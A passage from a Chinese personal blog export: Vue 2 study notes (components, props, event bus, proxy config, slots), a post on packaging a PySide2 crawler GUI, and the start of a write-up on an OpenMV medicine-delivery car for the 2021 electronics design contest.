<li>销毁后自定义事件会失效,但原生DOM事件依然有效。</li>
<li>一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。</li>
</ol>
<h3 id="Vue组件化编程">Vue组件化编程</h3>
<h4 id="模块与组件、模块化与组件化">模块与组件、模块化与组件化</h4>
<h4 id="非单文件组件">非单文件组件</h4>
<p>Vue中使用组件的三大步骤</p>
<ol>
<li>定义组件(创建组件)</li>
<li>注册组件</li>
<li>使用组件(写组件标签)</li>
</ol>
<p>一、如何定义一个组件?</p>
<p>使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别;区别如下:</p>
<ol>
<li>el不要写，为什么?——最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。</li>
<li>data必须写成函数，为什么?——避免组件被复用时，数据存在引用关系。</li>
</ol>
<p>备注:使用template可以配置组件结构。</p>
<p>二、如何注册组件?</p>
<ol>
<li>局部注册:靠new Vue的时候传入components选项</li>
<li>全局注册:靠Vue.component('组件名’,组件)</li>
</ol>
<p>三、编写组件标签: &lt; school&gt;&lt;/ school&gt;</p>
<h5 id="几个注意点">几个注意点</h5>
<p>1.关于组件名</p>
<p>一个单词组成:</p>
<p>第一种写法(首字母小写): school第二种写法(首字母大写):</p>
<p>School多个单词组成:</p>
<p>第一种写法(kebab-case命名): my-school</p>
<p>第二种写法(CamelCase命名):MySchool（需要Vue脚手架支持)备注:</p>
<p>(1).组件名尽可能回避HTML中已有的元素名称，例如: h2、H2都不行。</p>
<p>(2).可以使用name配置项指定组件在开发者工具中呈现的名字。</p>
<p>2.关于组件标签:</p>
<p>第一种写法: &lt; school&gt;&lt;/ school&gt;</p>
<p>第二种写法:&lt; school/&gt;</p>
<p>备注:不用使用脚手架时,&lt; school/&gt;会导致后续组件不能渲染。</p>
<p>3.一个简写方式</p>
<p>const school = Vue.extend(options）可简写为: const school = options</p>
<h5 id="关于VueComponent">关于VueComponent</h5>
<ol>
<li>
<p>school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue. extend生成的。</p>
</li>
<li>
<p>我们只需要写&lt; school/&gt;或&lt; school&gt;&lt; /school&gt;，Vue解析时会帮我们创建school组件的实例对象即Vue帮我们执行的: new VueComponent(options)。</p>
</li>
<li>
<p>特别注意:每次调用Vue.extend，返回的都是一个全新的VueComponent! !!!</p>
</li>
<li>
<p>关于this指向;<br>
(1).组件配置中:<br>
data函数、methods中的函数、watch中的函数、computed中的函数它们的this均是【VueComponent实例对象】.</p>
<p>(2) .new Vue()配置中;<br>
data函数、methods中的函数、watch中的函数、computed中的函数它们的this均是【Vue实例对象】。</p>
</li>
<li>
<p>VueComponent的实例对象，以后简称vc（也可称之为:组件实例对象）。<br>
Vue的实例对象，以后简称vm。</p>
</li>
</ol>
<ul>
<li>一个重要的内置关系:VueComponent.prototype.<em>proto</em>_ === Vue.prototype</li>
<li>为什么要有这个关系:让组件实例对象（vc）可以访问到Vue原型上的属性、方法。</li>
</ul>
<h4 id="单文件组件">单文件组件</h4>
<h4 id="关于不同版本的Vue">关于不同版本的Vue</h4>
<p>1.vue.js 与vure.runtime.xxx.js的区别:</p>
<p>(1).vue.js是完整版的Vue,包含:核心功能+模板解析器。</p>
<p>(2) .vue.runtime.xxx.js是运行版的Vue，只包含:核心功能;没有模板解析器。</p>
<p>2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。</p>
<h4 id="使用Vue脚手架">使用Vue脚手架</h4>
<h4 id="ref属性">ref属性</h4>
<p>1.被用来给元素或子组件注册引用信息(id的替代者)</p>
<p>2.应用在htm1标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象(vc)</p>
<p>3.使用方式:打标识:&lt; h1 ref=“xxx”&gt;…&lt; /h1&gt;或&lt; School ref=“xxx”&gt;&lt; /School&gt;获取: <a href="http://this.$refs.xxx">this.$refs.xxx</a></p>
<h4 id="配置项props">配置项props</h4>
<p>功能:让组件接收外部传过来的数据</p>
<p>(1).传递数据:<br>
&lt; Demo name=“xxx” /&gt;</p>
<p>(2).接收数据:</p>
<p>第一种方式（只接收):props: [ &quot;name ’ ]</p>
<p>第二种方式（限制类型）:props:{name:String}</p>
<p>第三种方式（限制类型、限制必要性、指定默认值):props:{name:{type:String,1/类型required:true,1/必要性deflault:'老王’//默认值}</p>
<p><strong>备注</strong>: props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告,若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</p>
<h4 id="mixin（混入）">mixin（混入）</h4>
<p>功能:可以把多个组件共用的配置提取成一个混入对象使用方式:</p>
<p>第一步定义混合,例如:{data()i…},methods:{…}}</p>
<p>第二步使用混入，例如:</p>
<p>(1).全局混入:Vue.mixin(xxx)</p>
<p>(2).局部混入:mixins: [ &quot;xxx ']</p>
<h4 id="插件">插件</h4>
<p>功能:用于增强Vue</p>
<p>本质:包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。</p>
<p>定义插件:</p>
<p>对象.install = function (Vue,options) {</p>
<ol>
<li>
<p>添加全局过滤器Vue.filter(…)</p>
</li>
<li>
<p>添加全局指令Vue.directive( … .)</p>
</li>
<li>
<p>配置全局混入(合)Vue.mixin(…)</p>
</li>
<li>
<p>添加实例方法</p>
<p>Vue.prototype.$myMethod = function () {…}</p>
<p>Vue.prototype. $myProperty = xxXX</p>
</li>
</ol>
<p>使用插件:Vue.use()</p>
<h4 id="总结TodoList案例">总结TodoList案例</h4>
<ol>
<li>
<p>组件化编码流程:</p>
<p>(1 ).拆分静态组件:组件要按照功能点拆分，命名不要与html元素冲突。</p>
<p>(2).实现动态组件:考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用:1).一个组件在用:放在组件自身即可。2).一些组件在用:放在他们共同的父组件上(状态提升)。</p>
<p>(3).实现交互:从绑定事件开始。</p>
</li>
<li>
<p>props适用于:</p>
<p>(1).父组件==&gt;子组件通信</p>
<p>(2).子组件==&gt;父组件通信（要求父先给子一个函数)</p>
</li>
<li>
<p>使用v-model时要切记: v-model绑定的值不能是props传过来的值，因为props是不可以修改的!</p>
</li>
<li>
<p>props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。</p>
</li>
</ol>
<h4 id="浏览器本地存储（webStorage）">浏览器本地存储（webStorage）</h4>
<ol>
<li>
<p>存储内容大小一般支持5MB左右(不同浏览器可能还不一样)</p>
</li>
<li>
<p>浏览器端通过Window.sessionStorage和Window.localStorage属性来实现本地存储机制。</p>
</li>
<li>
<p>相关API:</p>
<p>1.xxxxxStorage.setItem( 'key ’ , 'value ’ );<br>
该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的</p>
<p>2.xxxxxStorage.getItem( 'person ’ );<br>
该方法接受一个键名作为参数，返回键名对应的值。</p>
<p>3.xxxXxStorage.removeItem( ’ key ’ );<br>
该方法接受一个键名作为参数，并把该键名从存储中删除。</p>
<p>4.xxxxxStorage.clear()<br>
该方法会清空存储中的所有数据。</p>
</li>
<li>
<p>备注:<br>
1.SessionStorage存储的内容会随着浏览器窗口关闭而消失。</p>
<p>2.LocalStorage存储的内容，需要手动清除才会消失。</p>
<p>3.xxxxxStorage.getItem(xxx)如果xxx对应的value获取不到，那么getltem的返回值是null。</p>
<p>4.]SON.parse(nul’)的结果依然是null。</p>
</li>
</ol>
<h4 id="全局事件总线（GlobalEventBus）">全局事件总线（GlobalEventBus）</h4>
<ol>
<li>
<p>一种组件间通信的方式，适用于任意组件间通信。</p>
</li>
<li>
<p>安装全局事件总线：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
	<span class="token operator">...</span><span class="token operator">...</span>
	<span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$bus <span class="token operator">=</span> <span class="token keyword">this</span> <span class="token comment">//安装全局事件总线，$bus就是当前应用的vm</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token operator">...</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> </code></pre>
</li>
<li>
<p>使用事件总线：</p>
<ol>
<li>
<p>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>$bus<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
<li>
<p>提供数据：<code>this.$bus.$emit('xxxx',数据)</code></p>
</li>
</ol>
</li>
<li>
<p>最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件。</p>
</li>
</ol>
<h4 id="消息订阅与发布（pubsub）">消息订阅与发布（pubsub）</h4>
<ol>
<li>
<p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p>
</li>
<li>
<p>使用步骤：</p>
<ol>
<li>
<p>安装pubsub：<code>npm i pubsub-js</code></p>
</li>
<li>
<p>引入: <code>import pubsub from 'pubsub-js'</code></p>
</li>
<li>
<p>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>pid <span class="token operator">=</span> pubsub<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span> <span class="token comment">//订阅消息</span>
<span class="token punctuation">&#125;</span></code></pre>
</li>
<li>
<p>提供数据：<code>pubsub.publish('xxx',数据)</code></p>
</li>
<li>
<p>最好在beforeDestroy钩子中，用<code>PubSub.unsubscribe(pid)</code>去<span style="color:red">取消订阅。</span></p>
</li>
</ol>
</li>
</ol>
<h4 id="nextTick">nextTick</h4>
<ol>
<li>语法：<code>this.$nextTick(回调函数)</code></li>
<li>作用：在下一次 DOM 更新结束后执行其指定的回调。</li>
<li>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</li>
</ol>
<h4 id="Vue封装的过度与动画">Vue封装的过度与动画</h4>
<ol>
<li>
<p>作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。</p>
</li>
<li>
<p>图示：<img src="https://img04.sogoucdn.com/app/a/100520146/5990c1dff7dc7a8fb3b34b4462bd0105" style="width:60%" /></p>
</li>
<li>
<p>写法：</p>
<ol>
<li>
<p>准备好样式：</p>
<ul>
<li>元素进入的样式：
<ol>
<li>v-enter：进入的起点</li>
<li>v-enter-active：进入过程中</li>
<li>v-enter-to：进入的终点</li>
</ol>
</li>
<li>元素离开的样式：
<ol>
<li>v-leave：离开的起点</li>
<li>v-leave-active：离开过程中</li>
<li>v-leave-to：离开的终点</li>
</ol>
</li>
</ul>
</li>
<li>
<p>使用<code>&lt;transition&gt;</code>包裹要过度的元素，并配置name属性：</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">&lt;transition name&#x3D;&quot;hello&quot;&gt;
	&lt;h1 v-show&#x3D;&quot;isShow&quot;&gt;你好啊！&lt;&#x2F;h1&gt;
&lt;&#x2F;transition&gt;</code></pre>
</li>
<li>
<p>备注：若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p>
</li>
</ol>
</li>
</ol>
<h4 id="vue脚手架配置代理">vue脚手架配置代理</h4>
<h5 id="方法一">方法一</h5>
<p>​	在vue.config.js中添加如下配置：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">devServer<span class="token operator">:</span><span class="token punctuation">&#123;</span>
  proxy<span class="token operator">:</span><span class="token string">"http://localhost:5000"</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>说明：</p>
<ol>
<li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li>
<li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li>
<li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li>
</ol>
<h5 id="方法二">方法二</h5>
<p>​	编写vue.config.js配置具体代理规则：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	devServer<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      proxy<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token string">'/api1'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 匹配所有以 '/api1'开头的请求路径</span>
        target<span class="token operator">:</span> <span class="token string">'http://localhost:5000'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>
        changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        pathRewrite<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">'^/api1'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token string">'/api2'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 匹配所有以 '/api2'开头的请求路径</span>
        target<span class="token operator">:</span> <span class="token string">'http://localhost:5001'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>
        changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        pathRewrite<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">'^/api2'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/</span></code></pre>
<p>说明：</p>
<ol>
<li>
<p>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</p>
</li>
<li>
<p>缺点：配置略微繁琐，请求资源时必须加前缀。</p>
</li>
<li>
<p>可以配置多个代理，且可以灵活的控制请求是否走代理。</p>
</li>
<li>
<p>缺点：配置略微繁琐，请求资源时必须加前缀。</p>
</li>
</ol>
<h4 id="插槽">插槽</h4>
<ol>
<li>
<p>作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:orange">父组件 ===&gt; 子组件</strong> 。</p>
</li>
<li>
<p>分类：默认插槽、具名插槽、作用域插槽</p>
</li>
<li>
<p>使用方式：</p>
<ol>
<li>
<p>默认插槽：</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">父组件中：
        &lt;Category&gt;
           &lt;div&gt;html结构1&lt;&#x2F;div&gt;
        &lt;&#x2F;Category&gt;
子组件中：
        &lt;template&gt;
            &lt;div&gt;
               &lt;!-- 定义插槽 --&gt;
               &lt;slot&gt;插槽默认内容...&lt;&#x2F;slot&gt;
            &lt;&#x2F;div&gt;
        &lt;&#x2F;template&gt;</code></pre>
</li>
<li>
<p>具名插槽：</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">父组件中：
        &lt;Category&gt;
            &lt;template slot&#x3D;&quot;center&quot;&gt;
              &lt;div&gt;html结构1&lt;&#x2F;div&gt;
            &lt;&#x2F;template&gt;

            &lt;template v-slot:footer&gt;
               &lt;div&gt;html结构2&lt;&#x2F;div&gt;
            &lt;&#x2F;template&gt;
        &lt;&#x2F;Category&gt;
子组件中：
        &lt;template&gt;
            &lt;div&gt;
               &lt;!-- 定义插槽 --&gt;
               &lt;slot name&#x3D;&quot;center&quot;&gt;插槽默认内容...&lt;&#x2F;slot&gt;
               &lt;slot name&#x3D;&quot;footer&quot;&gt;插槽默认内容...&lt;&#x2F;slot&gt;
            &lt;&#x2F;div&gt;
        &lt;&#x2F;template&gt;</code></pre>
</li>
<li>
<p>作用域插槽：</p>
<ol>
<li>
<p>理]解：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）</p>
</li>
<li>
<p>具体编码：</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">父组件中：
		&lt;Category&gt;
			&lt;template scope&#x3D;&quot;scopeData&quot;&gt;
				&lt;!-- 生成的是ul列表 --&gt;
				&lt;ul&gt;
					&lt;li v-for&#x3D;&quot;g in scopeData.games&quot; :key&#x3D;&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;&#x2F;li&gt;
				&lt;&#x2F;ul&gt;
			&lt;&#x2F;template&gt;
		&lt;&#x2F;Category&gt;

		&lt;Category&gt;
			&lt;template slot-scope&#x3D;&quot;scopeData&quot;&gt;
				&lt;!-- 生成的是h4标题 --&gt;
				&lt;h4 v-for&#x3D;&quot;g in scopeData.games&quot; :key&#x3D;&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;&#x2F;h4&gt;
			&lt;&#x2F;template&gt;
		&lt;&#x2F;Category&gt;
子组件中：
        &lt;template&gt;
            &lt;div&gt;
                &lt;slot :games&#x3D;&quot;games&quot;&gt;&lt;&#x2F;slot&gt;
            &lt;&#x2F;div&gt;
        &lt;&#x2F;template&gt;
		
        &lt;script&gt;
            export default &#123;
                name:&#39;Category&#39;,
                props:[&#39;title&#39;],
                &#x2F;&#x2F;数据在子组件自身
                data() &#123;
                    return &#123;
                        games:[&#39;红色警戒&#39;,&#39;穿越火线&#39;,&#39;劲舞团&#39;,&#39;超级玛丽&#39;]
                    &#125;
                &#125;,
            &#125;
        &lt;&#x2F;script&gt;</code></pre>
</li>
</ol>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Pyside2封装爬虫程序</title>
    <url>/python/pythonwebcatch-pyside2/</url>
    <content><![CDATA[<h3 style="text-align:center;font-weight:700;color:#B399FF"><em>先附一张成果图吧</em></h3>
<p><img src="https://i.loli.net/2021/11/24/NhMPfmDYrltEc2y.png" alt=""></p>
<h3 style="text-align:center;font-weight:700;color:#B399FF">程序框架</h3>
<h4 id="设计目的">设计目的</h4>
<p>快期末了，没错，这就是我的期末作业。</p>
<p>因为考试原因，计划用一周的时间来写，写到哪里算哪里嘛 <span class="emoji" alias="stuck_out_tongue_closed_eyes" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8">😝</span> 一边上课、一边复习、一边利用课余时间开发，这也就是我一周的成果吧。</p>
<p>本来打算做一个爬虫工具集合软件，做到一半又想利用采集到的数据进行可视化展示或者数据分析，还想自动生成页面部署到服务器上…没错，就是这个原因，导致重构了好几次代码 <span class="emoji" alias="cry" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span> 所以，设计框架之前一定要想好需求！一口气吃不成一个胖子，慢慢积累吧~</p>
<h4 id="主要步骤实现">主要步骤实现</h4>
<h5 id="设计UI（考虑主要功能以及交互方式）">设计UI（考虑主要功能以及交互方式）</h5>
<p>因为以前没有构建大型程序框架的经历，这个程序也算是我的第一个“大型程序”啦 <span class="emoji" alias="laughing" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">😆</span> 记得听老师说过一句话：“从上而下构建，从下而上实现。”这句话一直指引着我去优化封装、去重构代码。我也确实体会到了一个好的程序框架的重要性。</p>
<p><em><strong>前台界面怎能不炫酷？！</strong></em></p>
<p>没错，我找到了<a href="https://www.qt.io/product/ui-design-tools" style="font-weight:700;color:#B399FF">QT Design Studio</a>，但是…</p>
<p><img src="https://i.loli.net/2021/11/24/LKD1lijeuHhBEd5.png" alt=""></p>
<p><font style="font-weight:700;color:#B399FF"><em>太劝退了吧这…</em></font></p>
<p>再想一想，python的话，应该对GUI或者前台没有太大的需求，投入过多精力似乎没有太大必要，毕竟就看小程序来讲，Qt的designer已经足够了。于是，我又开始用designer设计界面，然后保存ui文件调用，等等！就是这里，一定要强调下pyside2使用ui文件的两种方法：</p>
<p><strong>1.利用pyside2-uic工具把ui文件转化为python类</strong></p>
<p>命令行输入以下代码</p>
<pre class="language-none"><code class="language-none">pyside2-uic mainwindow.ui &gt; ui_mainwindow.py</code></pre>
<p>创建类时调用以下代码即可</p>
<pre class="language-none"><code class="language-none">class MainWindow(QMainWindow):
    def __init__(self):
        super(MainWindow, self).__init__()
        self.ui &#x3D; Ui_MainWindow()
        self.ui.setupUi(self)</code></pre>
<p><strong>2.动态加载</strong></p>
<pre class="language-none"><code class="language-none"># 导入QtUiTools模块
from PySide2.QtUiTools import QUiLoader

QUiLoader可以动态加载ui文件并立即使用
ui_file &#x3D; QFile(&quot;mainwindow.ui&quot;)
ui_file.open(QFile.ReadOnly)

loader &#x3D; QUiLoader()
window &#x3D; loader.load(ui_file)
window.show()</code></pre>
<p><strong>3.补充：pyqt5中使用方法</strong></p>
<pre class="language-none"><code class="language-none"># 使用pyuic5转换到py文件
# 使用pyrcc5转化资源文件
# 动态加载
from PyQt5.uic import loadUi
...
loadUi(&quot;widget.ui&quot;,self)
...</code></pre>
<p>第一次我使用了“动态加载”，这里会有一些bug。例如我们有设置这个程序的主题title，但这里的主题名称却是“Mfgtool”（默认的主题名）。还比如不会触发QMainWindow窗口的事件等等。当然要能接收窗口事件，需要重写对应的事件接口，而且这样重写出来的效果也不是最佳，所以这里不作详细说明了。具体例子：<a href="https://stackoverflow.com/questions/53828666/pyside2-qmainwindow-loaded-from-ui-file-not-triggering-window-events">python - PySide2 QMainWindow loaded from ui file not triggering window events - Stack Overflow</a></p>
<p>所以，采用静态方式加载，这样事件也可以覆盖，非常类似于直接使用Qt IDE开发工具一样方便。</p>
<h5 id="整理子爬虫程序（找到相同点和不同点）">整理子爬虫程序（找到相同点和不同点）</h5>
<p>保证子程序可以正常运行的情况下，整合到主程序里。</p>
<p>可以找到不同程序的共同点，例如requests请求，可以封装为get请求，保存数据也可以封装到save函数里。针对不同网址放入不同的类型里面即可，既利于对程序的修改，有利于整理思路脉络，还能减少bug发生的概率。</p>
<h5 id="对不同窗口进行整合">对不同窗口进行整合</h5>
<pre class="language-none"><code class="language-none">from PySide2.QtWidgets import QApplication, QWidget
#引入主窗口
from mainUI import Ui_mainUI
#引入子窗口
from childUI import Ui_childUI
 
#创建主窗口类
class MainWindow(QWidget):
    def __init__(self):
        super(MainWindow, self).__init__()
        &#x2F;&#x2F;引入主窗口类
        self.ui &#x3D; Ui_mainUI()
        self.ui.setupUi(self)
 
        #创建按钮点击信号连接 其中button是主窗口中的按钮，在主窗口类文件中添加，这里不详细说明
        self.ui.button.clicked.connect(self.childShowFun)
    #创建子窗口的方法，即槽函数
    def childShowFun(self):
        #注意，这里的childwindow不能定义成临时变量，必须定义成主窗口类MainWindow的成员变量，&#39;
        &#39;如果是临时变量，即前面没有self，那么子窗口只会闪一下，就会消失
        self.childwindow &#x3D; ChildWindow()
        self.childwindow .show()
 
 
#创建子窗口类
class ChildWindow(QWidget):
    def __init__(self):
        super(ChildWindow, self).__init__()
        #引入子窗口类
        self.ui &#x3D; Ui_childUI()
        self.ui.setupUi(self)
 
 
if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
 
    app &#x3D; QApplication([])
    mainwindow &#x3D; MainWindow()
    mainwindow.show()
    app.exec_()</code></pre>
<p>这是一个子窗口模板，这里也要用静态加载。</p>
<p>⚠注意：如果有多个子窗口，要注意不同模块的函数名是否相同，不然会出现不同槽函数指向同一窗口的现象。我试图通过改文件名，改属性，最后发现进入ui生成的静态py文件更改函数名称是最佳解决方式。</p>
<h5 id="填充小功能">填充小功能</h5>
<p>这一阶段主要是查看官方文档，找到相关的函数，之后链接自定义一些相关的槽函数即可。</p>
<h3 id="一些问题与改进">一些问题与改进</h3>
<p>logo的icon文件以及png文件无法打包好还需qrc资源嵌入，也就是涉及到图片的储存与调用，后期修bug和添加小功能时，也许会增加进去吧。</p>
<h3 id="相关资源">相关资源</h3>
<p>程序源码请前往<a href="https://github.com/Alexation/Spider_Collection" style="font-weight:700;color:#B399FF">Github</a></p>
<p>打包程序请前往<a href="https://alexation.lanzoui.com/i5979wxb19g" style="font-weight:700;color:#B399FF">Alexation（这就是我的主程序名字哦）</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Pyside2</tag>
      </tags>
  </entry>
  <entry>
    <title>2021大学生电子设计竞赛</title>
    <url>/competition/nuedc_1/</url>
    <content><![CDATA[<p>本次竞赛为2021全国大学生电子设计竞赛F题。小编本科大二在读，电气专业。基础不好，不喜勿喷，感谢访问本网站，如果能给你提供新思路就是我最大的荣幸！</em></font></p>
<p><a href="https://alexation.lanzoui.com/iuUzbwkxx7a" style="font-weight:700;color:#B399FF"><em>点击此处获取F题PDF题目以及数字字模</em></a></p>
<p>开赛前看了看各大论坛上的控制题目的预测，包括亚克力球里面放小车，用小车和无人机通信…为此特地去学了学串口、蓝牙通信，最后看到题目震惊：原来摄像头可带处理器模块原来是这个意思！<span class="emoji" alias="upside_down_face" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f643.png?v8">🙃</span> 因为组内没有人会用OpenMV，确定下这个题目还是不容易的。毕竟明年想去智能车比赛，想不到电赛让我速成摄像头 <span class="emoji" alias="laughing" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">😆</span></p>
<p>首先我仅代表我的组员和我感谢比赛过程中帮助过我们的同学、指导老师、以及<a href="https://singtown.com/openmv/" style="font-weight:700;color:#B399FF">星瞳科技</a>，我们最后的成果包括相关设备的购买均基于星瞳科技。</p>
<h2 style="text-align:center;font-weight:700;color:#B399FF">关于题目</h2>
<p>“制作智能送药小车，模拟完成在医院药房与病房间药品的送取作业。”嗯…这很现实<span class="emoji" alias="mask" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f637.png?v8">😷</span>。第一段就是说循迹红线、中远端病房号不固定。第二段增加一个识别药品和亮灯。说实话，这个数字识别确实劝退 <span class="emoji" alias="cry" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span></p>
<h2 style="text-align:center;font-weight:700;color:#B399FF">数字识别</h2>
<ol>
<li>Netlet：刚开赛时候一些论坛和群就有人说nn库不能用了，我们当时还没有意识到事情的严重性。等到写算法时候发现，就算把nn库手动装到IDE和SD卡里，还是会有未知bug出现。</li>
<li>Edge Impulse神经网络训练：拍照片到网站在线训练出tflite文件，然后进行在线识别。记得当初拍了20000多张照片，最后去重后有6000多张，训练了半个小时，然而，识别正确率并不高…淦淦淦淦淦！</li>
<li>特征点匹配：虽然和题目要求及其相似，但是我们还是优先考虑了模板匹配，感兴趣的同学可以试一试。</li>
<li>模板匹配：拍模板，识别出来会有反馈，经测试效果还可以，不过对图像位置大小要求高一点，直接通过十字路口可能识别不到，so，经我们一致决定：让它到十字路口抽搐几下，识别率马上就高了起来。</li>
</ol>
<h2 style="text-align:center;font-weight:700;color:#B399FF">细节实现</h2>
<ul>
<li>提取红色路线：识别红线可以通过摄像头设置阈值来提取红线，刚开始我们设置的是红线黑线全部展示，后来发现如果保留黑线的话如果偏离角度差一点儿，拟合效果就会大打折扣，这并不能通过调节PID参数或者拟合后直线斜率占比实现。(不要问我怎么知道的)</li>
<li>PID调节：这部分<a href="https://book.openmv.cc/project/follow-lines.html" style="font-weight:700;color:#B399FF">星瞳科技快速上手部分</a>有提供源码，这里不进行过多解释，我们测试时用的就是那个例程，参数都没改。</li>
<li>控制启动停止：熟悉的红外对管…</li>
<li>LED：我们就打算用OpenMV上的RGB灯（虽然被测试专业员吐槽了，但好像没啥影响 <span class="emoji" alias="smirk" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60f.png?v8">😏</span></li>
<li>检测药品：因为当时没有压力传感器（开赛就买了，测试才到），我们就用光敏传感器代替了，这个用压感效果应该会不错，不过光感调好灵敏度也没有什么影响，当然，超声波模块也可。</li>
